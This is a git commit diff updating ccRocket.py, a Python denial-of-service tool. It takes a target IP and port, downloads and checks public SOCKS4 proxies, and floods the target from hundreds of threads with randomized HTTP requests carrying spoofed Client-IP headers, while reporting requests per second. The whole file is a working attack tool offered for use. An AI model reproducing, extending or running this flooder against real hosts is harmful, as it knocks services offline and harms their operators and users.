b4373416f91fe423eedef2370f0a4ca3509c03af
cmdenthusiant <53386624+cmdenthusiant@users.noreply.github.com>
2021-10-18 20:40:24 +0800

    Update ccRocket.py

--- ccRocket.py
+++ ccRocket.py
@@ -1,7 +1,9 @@
 #code by HKquiet
 #from math import trunc
+from math import trunc
 import os
 import time
+from typing import List
 import requests
 import sys
 import socks
@@ -43,23 +45,23 @@ acept = [
 	"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
 	"Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n"
 ]
-#refer = [
-#    'https://www.google.com/',
-#    'https://www.youtube.com/',
-#    'https://www.dstat.cc/',
-#    'https://www.check-host.net//',
-#    'https://www.discord.com/',
-#    'https://www.rrcs-67-79-47-3.sw.biz.rr.com/',
-#    'https://www.facebook.com/',
-#    'https://www.instagram.com/',
-#    'https://www.bing.com/',
-#    'https://www.virtualbox.org/',
-#    'https://www.vedbex.com/',
-#    'https://www.github.com/',
-#    'https://www.whatsapp.com/',
-#    'https://www.google.com/maps/search/',
-#    'https://www.kail.org/']
-
+refer = [
+    'https://www.google.com/',
+    'https://www.youtube.com/',
+    'https://www.dstat.cc/',
+    'https://www.check-host.net//',
+    'https://www.discord.com/',
+    'https://www.rrcs-67-79-47-3.sw.biz.rr.com/',
+    'https://www.facebook.com/',
+    'https://www.instagram.com/',
+    'https://www.bing.com/',
+    'https://www.virtualbox.org/',
+    'https://www.vedbex.com/',
+    'https://www.github.com/',
+    'https://www.whatsapp.com/',
+    'https://www.google.com/maps/search/',
+    'https://www.kail.org/']
+lock = threading.RLock()
 def clear():
     if os.name == 'nt':
         return os.system('cls')
@@ -74,7 +76,10 @@ def main():
     global thr
     global proxies
     global mode
-    
+    global thlist
+    global CpOutPutKill
+    global proxiesChecked
+
     target = input("Target ip:")
     if target == "":
         main()
@@ -84,6 +89,7 @@ def main():
     elif mode == 'head':mode = 'HEAD'
     elif mode == 'get':mode = 'GET'
     elif mode == 'connect':mode = 'CONNECT'
+    else: return
     port = input("Port(default=80):")
     if port == '':port = 80
     thr = input("Threads(default=500):")
@@ -91,18 +97,68 @@ def main():
     getnewproxies = input("Do you want to get a new socks List?(default=y)(y/n)")
     if getnewproxies == "y" or getnewproxies == '':get_new_proxies()
     proxies = open("proxy.txt").readlines()
-    print("there are {} proxies".format(str(len(proxies))))
+    print("There are {} proxies".format(str(len(proxies))))
+    ifCheckProxies = input("Do you want to check whether the proxies can work?(default=y)(y/n)")
+    thlist = []
+    if ifCheckProxies == "y" or ifCheckProxies == "":
+        CpOutPutKill = False
+        proxiesChecked = 0
+        threading.Thread(target=output,args=(True,)).start()
+        proxies1 = proxies.copy()
+        for i in range(len(proxies1)):
+            while True:
+                try:
+                    proxy = proxies1[i].strip().split(":")
+                    th = threading.Thread(target=checkProxies, args=(proxy,i))
+                    thlist.append(i)
+                    th.start()
+                    break
+                except RuntimeError:
+                    continue
+        while True:
+            if len(thlist) == 0:
+                CpOutPutKill = True
+                break
+        print("There are {} proxies worked".format(str(len(proxies))))
     startatk()
 
 def get_new_proxies():
     """get new proxies"""
-    newproxies = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4&country=all&anonymity=all&ssl=all&timeout=5000")
+    newproxies = requests.get("https://www.proxyscan.io/download?type=socks4")
     with open("proxy.txt", "wb") as write:
         write.write(newproxies.content)
         time.sleep(0.1)
         print("success get new proxies")
 
+def checkProxies(proxy,th):
+    global proxies
+    global thlist
+    global proxiesChecked
+    CountError = 0
+    for i in range(3):
+        try:
+            s = socks.socksocket()
+            s.settimeout(5)
+            s.set_proxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]))
+            s.connect((str(target), int(port)))
+            sended = s.send(str.encode("GET / HTTP/1.1\r\n\r\n".format(str(mode))))
+            if not sended:
+                CountError += 1
+            s.close()
+        except:
+            CountError += 1
+    lock.acquire()
+    if CountError == 3:
+        proxies.remove(proxy[0]+':'+proxy[1]+"\n")
+    thlist.remove(th)
+    proxiesChecked += 1
+    lock.release()
+
 def startatk():
+    global Rps
+    global proxyChanged
+    Rps = 0
+    proxyChanged = 0
     """start atk"""
     threads = []
     for i in range(int(thr)):
@@ -119,43 +175,61 @@ def startatk():
             n.start()
         except RuntimeError:
             return
+    output(False)
+    
 
 def atk(thrNum):
+    global Rps
+    global proxyChanged
     """attack server"""
     proxy = random.choice(proxies).strip().split(":")
     errorproxy = 0
     while True:
         if errorproxy > 10:
             proxy = random.choice(proxies).strip().split(":")
-            sys.stdout.write("[Proxy Timeout] Thread No.{} has changed proxy...                                                    \n\r".format(thrNum))
+            #sys.stdout.write("[Proxy Timeout] Thread No.{} has changed proxy...                                                    \n\r".format(thrNum))
+            proxyChanged += 1
             errorproxy = 0
         try:
             s1 = socks.socksocket()
             s1.set_proxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]))
-            data = ""
-            data += "{} /?={} HTTP/1.1\r\nHost: {}.{}.{}.{}:80\r\n".format(str(mode), str(random.randint(1, 30000)),str(random.randint(1, 255)), str(random.randint(1, 255)), str(random.randint(1, 255)), str(random.randint(1, 255)))
-            data += "User-Agent: {}\r\n".format(random.choice(userag))
-            data += random.choice(acept)
-            #data += "Referer: http://{}/\r\n".format(str(target))
+            host = "{} /?=qwertyuiopasdfghjklzxcvbnm&{} HTTP/1.1\r\nHost: {}\r\n".format(str(mode), str(str(random.randint(1, 30000000000))),target)
+            useragent = "User-Agent: {}\r\n".format(random.choice(userag))
+            accept = random.choice(acept)
+            referer = "Referer: {}\r\n".format(str(refer))
             #data += "Cookie: sid={}; path=/; status=enable;\r\n".format(str(random.randint(1000000000000, 9000000000000)), )
             #data += "Cache-Control: no-store\r\n"
             #data += "Content-Length: {}\r\n".format(str(len(dat)))
-            #data += "X-Forwarded-For: {}.{}.{}.{}\r\n".format(str(random.randint(1, 255)), str(random.randint(1, 255)), str(random.randint(1, 255)), str(random.randint(1, 255)))
-            data += "Client-IP: {}.{}.{}.{}\r\n".format(str(random.randint(1, 255)), str(random.randint(1, 255)), str(random.randint(1, 255)),str(random.randint(1, 255)))
-            data += "Forwarded: by={}.{}.{}.{}; for={}.{}.{}.{};\r\n".format(str(random.randint(1, 255)), str(random.randint(1, 255)), str(random.randint(1, 255)), str(random.randint(1, 255)), str(random.randint(1, 255)), str(random.randint(1, 255)), str(random.randint(1, 255)), str(random.randint(1, 255)))
-            data += "Connection: Keep-Alive\r\n\r\n"
+            #XForwordFor = "X-Forwarded-For: {}.{}.{}.{}\r\n".format(str(random.randint(1, 255)), str(random.randint(1, 255)), str(random.randint(1, 255)), str(random.randint(1, 255)))
+            clientIP = "Client-IP: {}.{}.{}.{}\r\n".format(str(random.randint(1, 255)), str(random.randint(1, 255)), str(random.randint(1, 255)),str(random.randint(1, 255)))
+            #data += "Forwarded: by={}.{}.{}.{}; for={}.{}.{}.{};\r\n".format(str(random.randint(1, 255)), str(random.randint(1, 255)), str(random.randint(1, 255)), str(random.randint(1, 255)), str(random.randint(1, 255)), str(random.randint(1, 255)), str(random.randint(1, 255)), str(random.randint(1, 255)))
+            connection = "Connection: Keep-Alive\r\n\r\n"
             #data += "{}\r\n\r\n".format(dat)
+            data = host + useragent + accept + referer + clientIP + connection
             s1.connect((str(target), int(port)))
-            s1.send(str.encode(data))
-            sys.stdout.write("floodling [ {}:{} ] <========== [ {}:{} ]                 \r".format(str(target), str(port), str(proxy[0]), str(proxy[1])))
+            sended = s1.send(str.encode(data))
+            if not sended:
+                errorproxy += 1
+                continue
+            lock.acquire()
+            Rps += 1
+            lock.release()
+            #sys.stdout.write("floodling [ {}:{} ] <==========(RPS:{})[ {}:{} ]                 \r".format(str(target), str(port),str(Rps) , str(proxy[0]), str(proxy[1])))
             try:
-                while True:
+                for i in range(200):
                     try:
-                        s1.send(str.encode(data))
-                    except socks.ProxyConnectionError or socks.GeneralProxyError or socks.ProxyError:
+                        host = "{} /?=qwertyuiopasdfghjklzxcvbnm&{} HTTP/1.1\r\nHost: {}\r\n".format(str(mode), str(str(random.randint(1, 30000000000))),target)
+                        data = host + useragent + accept + referer + clientIP + connection
+                        sended = s1.send(str.encode(data))
+                        if not sended:
+                            break
+                        lock.acquire()
+                        Rps +=1
+                        lock.release()
+                    except:
                         break
                 s1.close()
-                sys.stdout.write("floodling [ {}:{} ] <========== [ {}:{} ]             \r".format(str(target), str(port), str(proxy[0]), str(proxy[1])))
+                #sys.stdout.write("floodling [ {}:{} ] <==========(RPS:{}) [ {}:{} ]             \r".format(str(target), str(port), str(Rps), str(proxy[0]), str(proxy[1])))
             except:
                 s1.close()
         except KeyboardInterrupt:
@@ -164,6 +238,22 @@ def atk(thrNum):
         except:
             errorproxy += 1
             s1.close()
+
+def output(cp):
+    if cp:
+        global CpOutPutKill
+        global proxiesChecked
+        while not CpOutPutKill:
+            time.sleep(0.1)
+            sys.stdout.write("[*]Proxies checked: {}\r".format(str(proxiesChecked)))
+    else:
+        global Rps
+        global proxyChanged
+        while True:
+            time.sleep(1)
+            print("flooding [ {}:{} ](Rps:{}) {} proxy changed ".format(str(target), str(port), str(Rps), str(proxyChanged)))
+            Rps = 0
+            proxyChanged = 0
 
 if __name__ == "__main__":
     print('''##################################################################################################
